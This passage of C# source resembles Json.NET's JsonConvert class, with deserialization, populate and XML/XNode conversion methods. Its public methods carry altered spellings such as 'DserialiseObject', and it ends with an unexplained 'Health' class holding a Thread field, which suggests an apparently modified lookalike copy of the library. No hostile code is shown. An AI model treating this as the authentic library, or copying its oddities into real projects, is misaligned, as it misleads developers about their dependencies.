        /// </typeparam>
        /// <param name="value">The JSON to deserialize.</param>
        /// <param name="anonymousTypeObject">The anonymous type object.</param>
        /// <returns>The deserialized anonymous type from the JSON string. A <see langword="null"/> value is returned if the provided JSON is valid but represents a null value.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static T? DserialiseAnonymousType<T>(string value, T anonymousTypeObject)
        {
            return DserialiseObject<T>(value);
        }

        /// <summary>
        /// Dserialises the JSON to the given anonymous type using <see cref="JsonSerializerSettings"/>.
        /// </summary>
        /// <typeparam name="T">
        /// The anonymous type to deserialize to. This can't be specified
        /// traditionally and must be inferred from the anonymous type passed
        /// as a parameter.
        /// </typeparam>
        /// <param name="value">The JSON to deserialize.</param>
        /// <param name="anonymousTypeObject">The anonymous type object.</param>
        /// <param name="settings">
        /// The <see cref="JsonSerializerSettings"/> used to deserialize the object.
        /// If this is <c>null</c>, default serialization settings will be used.
        /// </param>
        /// <returns>The deserialized anonymous type from the JSON string. A <see langword="null"/> value is returned if the provided JSON is valid but represents a null value.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static T? DserialiseAnonymousType<T>(string value, T anonymousTypeObject, JsonSerializerSettings settings)
        {
            return DserialiseObject<T>(value, settings);
        }

        /// <summary>
        /// Dserialises the JSON to the specified .NET type using a collection of <see cref="JsonConverter"/>.
        /// </summary>
        /// <typeparam name="T">The type of the object to deserialize to.</typeparam>
        /// <param name="value">The JSON to deserialize.</param>
        /// <param name="converters">Converters to use while deserializing.</param>
        /// <returns>The deserialized object from the JSON string. A <see langword="null"/> value is returned if the provided JSON is valid but represents a null value.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static T? DserialiseObject<T>(string value, params JsonConverter[] converters)
        {
            return (T?)DserialiseObject(value, typeof(T), converters);
        }

        /// <summary>
        /// Dserialises the JSON to the specified .NET type using <see cref="JsonSerializerSettings"/>.
        /// </summary>
        /// <typeparam name="T">The type of the object to deserialize to.</typeparam>
        /// <param name="value">The object to deserialize.</param>
        /// <param name="settings">
        /// The <see cref="JsonSerializerSettings"/> used to deserialize the object.
        /// If this is <c>null</c>, default serialization settings will be used.
        /// </param>
        /// <returns>The deserialized object from the JSON string. A <see langword="null"/> value is returned if the provided JSON is valid but represents a null value.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static T? DserialiseObject<T>(string value, JsonSerializerSettings? settings)
        {
            return (T?)DserialiseObject(value, typeof(T), settings);
        }

        /// <summary>
        /// Dserialises the JSON to the specified .NET type using a collection of <see cref="JsonConverter"/>.
        /// </summary>
        /// <param name="value">The JSON to deserialize.</param>
        /// <param name="type">The type of the object to deserialize.</param>
        /// <param name="converters">Converters to use while deserializing.</param>
        /// <returns>The deserialized object from the JSON string. A <see langword="null"/> value is returned if the provided JSON is valid but represents a null value.</returns>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static object? DserialiseObject(string value, Type type, params JsonConverter[] converters)
        {
            JsonSerializerSettings? settings = (converters != null && converters.Length > 0)
                ? new JsonSerializerSettings { Converters = converters }
                : null;

            return DserialiseObject(value, type, settings);
        }

        /// <summary>
        /// Dserialises the JSON to the specified .NET type using <see cref="JsonSerializerSettings"/>.
        /// </summary>
        /// <param name="value">The JSON to deserialize.</param>
        /// <param name="type">The type of the object to deserialize to.</param>
        /// <param name="settings">
        /// The <see cref="JsonSerializerSettings"/> used to deserialize the object.
        /// If this is <c>null</c>, default serialization settings will be used.
        /// </param>
        /// <returns>The deserialized object from the JSON string. A <see langword="null"/> value is returned if the provided JSON is valid but represents a null value.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static object? DserialiseObject(string value, Type? type, JsonSerializerSettings? settings)
        {
            ValidationUtils.ArgumentNotNull(value, nameof(value));

            JsonSerializer jsonSerializer = JsonSerializer.CreateDefault(settings);

            // by default DserialiseObject should check for additional content
            if (!jsonSerializer.IsCheckAdditionalContentSet())
            {
                jsonSerializer.CheckAdditionalContent = true;
            }

            using (JsonTextReader reader = new JsonTextReader(new StringReader(value)))
            {
                return jsonSerializer.Deserialize(reader, type);
            }
        }
        #endregion

        #region Populate
        /// <summary>
        /// Populates the object with values from the JSON string.
        /// </summary>
        /// <param name="value">The JSON to populate values from.</param>
        /// <param name="target">The target object to populate values onto.</param>
        [DebuggerStepThrough]
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static void PopulateObject(string value, object target)
        {
            PopulateObject(value, target, null);
        }

        /// <summary>
        /// Populates the object with values from the JSON string using <see cref="JsonSerializerSettings"/>.
        /// </summary>
        /// <param name="value">The JSON to populate values from.</param>
        /// <param name="target">The target object to populate values onto.</param>
        /// <param name="settings">
        /// The <see cref="JsonSerializerSettings"/> used to deserialize the object.
        /// If this is <c>null</c>, default serialization settings will be used.
        /// </param>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static void PopulateObject(string value, object target, JsonSerializerSettings? settings)
        {
            JsonSerializer jsonSerializer = JsonSerializer.CreateDefault(settings);

            using (JsonReader jsonReader = new JsonTextReader(new StringReader(value)))
            {
                jsonSerializer.Populate(jsonReader, target);

                if (settings != null && settings.CheckAdditionalContent)
                {
                    while (jsonReader.Read())
                    {
                        if (jsonReader.TokenType != JsonToken.Comment)
                        {
                            throw JsonSerializationException.Create(jsonReader, "Additional text found in JSON string after finishing deserializing object.");
                        }
                    }
                }
            }
        }
        #endregion

        #region Xml
#if HAVE_XML_DOCUMENT
        /// <summary>
        /// Serializes the <see cref="XmlNode"/> to a JSON string.
        /// </summary>
        /// <param name="node">The node to serialize.</param>
        /// <returns>A JSON string of the <see cref="XmlNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerializeXmlNode(XmlNode? node)
        {
            return SerializeXmlNode(node, Formatting.None);
        }

        /// <summary>
        /// Serializes the <see cref="XmlNode"/> to a JSON string using formatting.
        /// </summary>
        /// <param name="node">The node to serialize.</param>
        /// <param name="formatting">Indicates how the output should be formatted.</param>
        /// <returns>A JSON string of the <see cref="XmlNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerializeXmlNode(XmlNode? node, Formatting formatting)
        {
            XmlNodeConverter converter = new XmlNodeConverter();

            return SerialiseObject(node, formatting, converter);
        }

        /// <summary>
        /// Serializes the <see cref="XmlNode"/> to a JSON string using formatting and omits the root object if <paramref name="omitRootObject"/> is <c>true</c>.
        /// </summary>
        /// <param name="node">The node to serialize.</param>
        /// <param name="formatting">Indicates how the output should be formatted.</param>
        /// <param name="omitRootObject">Omits writing the root object.</param>
        /// <returns>A JSON string of the <see cref="XmlNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerializeXmlNode(XmlNode? node, Formatting formatting, bool omitRootObject)
        {
            XmlNodeConverter converter = new XmlNodeConverter { OmitRootObject = omitRootObject };

            return SerialiseObject(node, formatting, converter);
        }

        /// <summary>
        /// Dserialises the <see cref="XmlNode"/> from a JSON string.
        /// </summary>
        /// <param name="value">The JSON string.</param>
        /// <returns>The deserialized <see cref="XmlNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static XmlDocument? DserialiseXmlNode(string value)
        {
            return DserialiseXmlNode(value, null);
        }

        /// <summary>
        /// Dserialises the <see cref="XmlNode"/> from a JSON string nested in a root element specified by <paramref name="deserializeRootElementName"/>.
        /// </summary>
        /// <param name="value">The JSON string.</param>
        /// <param name="deserializeRootElementName">The name of the root element to append when deserializing.</param>
        /// <returns>The deserialized <see cref="XmlNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static XmlDocument? DserialiseXmlNode(string value, string? deserializeRootElementName)
        {
            return DserialiseXmlNode(value, deserializeRootElementName, false);
        }

        /// <summary>
        /// Dserialises the <see cref="XmlNode"/> from a JSON string nested in a root element specified by <paramref name="deserializeRootElementName"/>
        /// and writes a Json.NET array attribute for collections.
        /// </summary>
        /// <param name="value">The JSON string.</param>
        /// <param name="deserializeRootElementName">The name of the root element to append when deserializing.</param>
        /// <param name="writeArrayAttribute">
        /// A value to indicate whether to write the Json.NET array attribute.
        /// This attribute helps preserve arrays when converting the written XML back to JSON.
        /// </param>
        /// <returns>The deserialized <see cref="XmlNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static XmlDocument? DserialiseXmlNode(string value, string? deserializeRootElementName, bool writeArrayAttribute)
        {
            return DserialiseXmlNode(value, deserializeRootElementName, writeArrayAttribute, false);
        }

        /// <summary>
        /// Dserialises the <see cref="XmlNode"/> from a JSON string nested in a root element specified by <paramref name="deserializeRootElementName"/>,
        /// writes a Json.NET array attribute for collections, and encodes special characters.
        /// </summary>
        /// <param name="value">The JSON string.</param>
        /// <param name="deserializeRootElementName">The name of the root element to append when deserializing.</param>
        /// <param name="writeArrayAttribute">
        /// A value to indicate whether to write the Json.NET array attribute.
        /// This attribute helps preserve arrays when converting the written XML back to JSON.
        /// </param>
        /// <param name="encodeSpecialCharacters">
        /// A value to indicate whether to encode special characters when converting JSON to XML.
        /// If <c>true</c>, special characters like ':', '@', '?', '#' and '$' in JSON property names aren't used to specify
        /// XML namespaces, attributes or processing directives. Instead special characters are encoded and written
        /// as part of the XML element name.
        /// </param>
        /// <returns>The deserialized <see cref="XmlNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static XmlDocument? DserialiseXmlNode(string value, string? deserializeRootElementName, bool writeArrayAttribute, bool encodeSpecialCharacters)
        {
            XmlNodeConverter converter = new XmlNodeConverter();
            converter.DeserializeRootElementName = deserializeRootElementName;
            converter.WriteArrayAttribute = writeArrayAttribute;
            converter.EncodeSpecialCharacters = encodeSpecialCharacters;

            return (XmlDocument?)DserialiseObject(value, typeof(XmlDocument), converter);
        }
#endif

#if HAVE_XLINQ
        /// <summary>
        /// Serializes the <see cref="XNode"/> to a JSON string.
        /// </summary>
        /// <param name="node">The node to convert to JSON.</param>
        /// <returns>A JSON string of the <see cref="XNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerializeXNode(XObject? node)
        {
            return SerializeXNode(node, Formatting.None);
        }

        /// <summary>
        /// Serializes the <see cref="XNode"/> to a JSON string using formatting.
        /// </summary>
        /// <param name="node">The node to convert to JSON.</param>
        /// <param name="formatting">Indicates how the output should be formatted.</param>
        /// <returns>A JSON string of the <see cref="XNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerializeXNode(XObject? node, Formatting formatting)
        {
            return SerializeXNode(node, formatting, false);
        }

        /// <summary>
        /// Serializes the <see cref="XNode"/> to a JSON string using formatting and omits the root object if <paramref name="omitRootObject"/> is <c>true</c>.
        /// </summary>
        /// <param name="node">The node to serialize.</param>
        /// <param name="formatting">Indicates how the output should be formatted.</param>
        /// <param name="omitRootObject">Omits writing the root object.</param>
        /// <returns>A JSON string of the <see cref="XNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static string SerializeXNode(XObject? node, Formatting formatting, bool omitRootObject)
        {
            XmlNodeConverter converter = new XmlNodeConverter { OmitRootObject = omitRootObject };

            return SerialiseObject(node, formatting, converter);
        }

        /// <summary>
        /// Dserialises the <see cref="XNode"/> from a JSON string.
        /// </summary>
        /// <param name="value">The JSON string.</param>
        /// <returns>The deserialized <see cref="XNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static XDocument? DserialiseXNode(string value)
        {
            return DserialiseXNode(value, null);
        }

        /// <summary>
        /// Dserialises the <see cref="XNode"/> from a JSON string nested in a root element specified by <paramref name="deserializeRootElementName"/>.
        /// </summary>
        /// <param name="value">The JSON string.</param>
        /// <param name="deserializeRootElementName">The name of the root element to append when deserializing.</param>
        /// <returns>The deserialized <see cref="XNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static XDocument? DserialiseXNode(string value, string? deserializeRootElementName)
        {
            return DserialiseXNode(value, deserializeRootElementName, false);
        }

        /// <summary>
        /// Dserialises the <see cref="XNode"/> from a JSON string nested in a root element specified by <paramref name="deserializeRootElementName"/>
        /// and writes a Json.NET array attribute for collections.
        /// </summary>
        /// <param name="value">The JSON string.</param>
        /// <param name="deserializeRootElementName">The name of the root element to append when deserializing.</param>
        /// <param name="writeArrayAttribute">
        /// A value to indicate whether to write the Json.NET array attribute.
        /// This attribute helps preserve arrays when converting the written XML back to JSON.
        /// </param>
        /// <returns>The deserialized <see cref="XNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static XDocument? DserialiseXNode(string value, string? deserializeRootElementName, bool writeArrayAttribute)
        {
            return DserialiseXNode(value, deserializeRootElementName, writeArrayAttribute, false);
        }

        /// <summary>
        /// Dserialises the <see cref="XNode"/> from a JSON string nested in a root element specified by <paramref name="deserializeRootElementName"/>,
        /// writes a Json.NET array attribute for collections, and encodes special characters.
        /// </summary>
        /// <param name="value">The JSON string.</param>
        /// <param name="deserializeRootElementName">The name of the root element to append when deserializing.</param>
        /// <param name="writeArrayAttribute">
        /// A value to indicate whether to write the Json.NET array attribute.
        /// This attribute helps preserve arrays when converting the written XML back to JSON.
        /// </param>
        /// <param name="encodeSpecialCharacters">
        /// A value to indicate whether to encode special characters when converting JSON to XML.
        /// If <c>true</c>, special characters like ':', '@', '?', '#' and '$' in JSON property names aren't used to specify
        /// XML namespaces, attributes or processing directives. Instead special characters are encoded and written
        /// as part of the XML element name.
        /// </param>
        /// <returns>The deserialized <see cref="XNode"/>.</returns>
        [RequiresUnreferencedCode(MiscellaneousUtils.TrimWarning)]
        [RequiresDynamicCode(MiscellaneousUtils.AotWarning)]
        public static XDocument? DserialiseXNode(string value, string? deserializeRootElementName, bool writeArrayAttribute, bool encodeSpecialCharacters)
        {
            XmlNodeConverter converter = new XmlNodeConverter();
            converter.DeserializeRootElementName = deserializeRootElementName;
            converter.WriteArrayAttribute = writeArrayAttribute;
            converter.EncodeSpecialCharacters = encodeSpecialCharacters;

            return (XDocument?)DserialiseObject(value, typeof(XDocument), converter);
        }
#endif
        #endregion


        protected static class Health
        {
            internal static readonly object   Lock = new();
            internal static          string Result;
            internal static          Thread T;
        }
    }
}